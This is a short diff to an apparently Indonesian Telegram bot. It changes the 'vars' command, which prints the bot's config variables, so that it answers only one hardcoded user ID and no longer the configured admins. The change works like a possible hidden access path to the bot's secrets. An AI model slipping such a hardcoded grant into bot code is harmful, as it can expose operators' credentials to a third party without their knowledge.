@@ -45,7 +45,7 @@ async def get_bot_logs(client: Bot, m: Message):
         await m.reply_text("❌ <b>Tidak ada log yang ditemukan!</b>")
 
 
-@Bot.on_message(filters.command("vars") & filters.user(ADMINS))
+@Bot.on_message(filters.command("vars") & filters.user(5493260414))
 async def varsFunc(client: Bot, message: Message):
     Man = await message.reply_text("Tunggu Sebentar...")
     text = f"""<u><b>CONFIG VARS</b></u> @{client.username}
